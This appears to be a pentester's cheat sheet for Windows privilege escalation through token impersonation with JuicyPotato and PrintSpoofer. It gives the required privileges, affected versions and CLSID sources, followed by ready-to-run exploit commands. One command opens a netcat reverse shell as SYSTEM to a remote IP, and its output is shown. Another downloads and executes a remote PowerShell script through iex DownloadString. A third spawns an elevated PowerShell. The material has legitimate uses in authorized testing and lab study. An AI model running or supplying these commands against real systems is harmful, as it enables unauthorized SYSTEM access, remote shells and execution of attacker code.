# Potatoes

<aside>
💡 Juicy Potato does not work for Windows Server 2019 and Windows 10 versions 1809 and
higher. However, there is another technique called **PrintSpoofer** for abusing these versions.

</aside>

## Affected Windows Versions

```powershell
Windows_10_Enterprise
Windows_10_Pro
Windows_7_Enterprise
Windows_8.1_Enterprise
Windows_Server_2008_R2_Enterprise
Windows_Server_2012_Datacenter
```

## Juicy Potato

**Requirements:** `SeImpersonatePrivilege` or/and `SeAssignPrimaryTokenPrivilege` enabled.

### Find a CLSID

[https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Pro](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Pro)

[http://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/](http://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/)

### Exploit - Get a netcat reverse shell

```powershell
c:\Users\Public>JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```

### Exploit - Download&Run a malicious script as Administrator

```powershell
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```

## Print Spoofer

**Requirements:** `SeImpersonatePrivilege`  enabled.

**Tested on:** Windows 8.1, Windows Server 2012 R2, Windows 10 and Windows Server 2019.

### Exploit - Run Powershell as Administrator

```powershell
.\PrintSpoofer.exe -i -c powershell.exe
```